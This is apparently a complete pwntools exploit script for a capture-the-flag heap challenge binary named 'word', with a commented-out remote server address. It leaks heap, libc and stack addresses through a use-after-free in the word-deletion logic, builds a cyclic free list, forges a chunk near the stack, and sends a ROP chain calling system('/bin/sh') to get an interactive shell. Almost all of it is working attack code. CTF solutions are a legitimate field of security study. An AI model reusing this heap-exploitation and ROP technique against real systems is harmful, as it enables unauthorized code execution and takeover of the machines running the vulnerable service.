#!/usr/bin/python
from pwn import *
pop_rdi_ret=0x400e23
class mypwn(object):

	def __init__(self):
		self.io=process("./word")
		#self.io=remote("202.120.7.107",60005)
		self.heap_base=0
		self.system_offset=-3663848
		self.elf=ELF("./libc")
		self.libc_offset=self.elf.symbols['__malloc_hook']+0x68
		self.system_offset=self.elf.symbols['system']
		self.binsh_offset= next(self.elf.search('/bin/sh'))

	def debug(self):
		if self.heap_base==0:
			sc=''
		else:
			sc='b *0x400c3f\nb *0x400e23\n'
		pwnlib.gdb.attach(self.io,sc)

	def search_word(self,word):
		io=self.io
		io.recvuntil("Quit\n")
		io.sendline("1")
		io.recvuntil("size:\n")
		io.sendline(str(len(word)))
		io.recvuntil("word:\n")
		io.sendline(word)
		pass

	def delete_word(self,word):
		self.search_word(word)
		self.io.recvuntil("?")
		self.io.sendline("y")
		#io.recvuntil("ted!\n")

	def check_word(self,word):
		self.search_word(word)
		self.io.recvuntil("?")
		io.sendline("n")

	def get_leak(self):
		special=chr(1)+" "*7
		special_buf=special*0x20
		special2="t       "*2
		nop="a"*0x8
		self.index_sentence(nop*2)
		self.index_sentence(special_buf)
		self.delete_word(chr(1))
		self.delete_word(nop*2)
		self.index_sentence(special2)
		self.search_word(chr(1))

		self.io.recvuntil("Found 256: ")
		content=self.io.recvuntil(chr(0))[:-1]
		addr=0
		rate=1
		for t in content:
			addr+=rate*ord(t)
			rate*=256
		self.heap_base=addr-0x7b8

		content=self.io.recvuntil("\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")[-16:-10]
		addr=0
		rate=1
		for t in content:
			addr+=rate*ord(t)
			rate*=256
		self.libc=addr
		self.libc-=self.libc_offset
		self.io.recvuntil("(y/n)?\n")
		self.io.sendline("n")
		self.io.recvuntil("Quit\n")
		self.io.sendline("1")
		self.io.send("c"*0x30)
		self.io.send("c"*0x30)
		self.io.recvuntil("c"*0x30)
		self.io.recvuntil("c"*0x30)
		content=self.io.recvuntil("is")[:-3]
		addr=0
		rate=1
		for t in content:
			addr+=rate*ord(t)
			rate*=256
		self.stack_base=addr
		print
		print
		self.heap_base=self.heap_base+0x1000
		self.chunk_addr=self.stack_base+146
		print "libc       : "+hex(self.libc)
		print "malloc_hook: "+hex(self.libc+self.libc_offset-0x68)
		print "stack_base : "+hex(self.stack_base)
		print "chunk_addr : "+hex(self.chunk_addr)
		print "heap_Base  : "+hex(self.heap_base)
		print
		self.system_addr=self.libc+self.system_offset
		self.binsh_addr=self.libc+self.binsh_offset
		self.io.sendline("1")
		self.io.sendline(" ")
		self.index_sentence(nop*20)
		self.index_sentence("s"*(0xff0-0x7f0))

	def index_sentence(self,sentence):
		size=len(sentence)
		io=self.io
		io.recvuntil("Quit\n")
		io.sendline("2")
		io.recvuntil("size:\n")
		io.sendline(str(size))
		io.recvuntil(" sentence:\n")
		io.sendline(sentence)
		pass

	def make_cycle(self):
		self.index_sentence('a'*54 + ' d')
		self.index_sentence('b'*54 + ' d')
		self.index_sentence('c'*54 + ' d')
		self.search_word('d')
		self.io.sendline('y')
		self.io.sendline('y')
		self.io.sendline('y')
		self.search_word('\x00')
		self.io.sendline('y')
		self.io.sendline('n')
		self.io.recvuntil("(y/n)?")
		self.io.recvuntil("(y/n)?")
		return 

	def run(self): 
		self.get_leak()
		self.make_cycle()
		self.io.sendline("2")
		self.io.sendline("48")
		payload=p64(self.chunk_addr)+" "+0x27*"a"
		self.io.sendline(payload)
		self.io.sendline("2")
		self.io.sendline("48")
		self.io.sendline(payload)
		self.io.sendline("2")
		self.io.sendline("48")
		self.io.sendline(payload)
		self.debug()
		self.io.sendline("2")
		self.io.sendline("56")
		self.io.recvuntil("Enter the sentence:")
		self.io.recvuntil("Enter the sentence:")
		self.io.recvuntil("Enter the sentence:")
		self.io.recvuntil("Enter the sentence:")
		payload ="A"*6
		payload += p64(pop_rdi_ret)
		payload += p64(self.binsh_addr)
		payload += p64(self.system_addr)
		payload +="a"*26
		self.io.sendline(payload)
		self.io.recvuntil("3: Quit")
		self.io.sendline("3")
		self.io.interactive()


p=mypwn()
p.run()

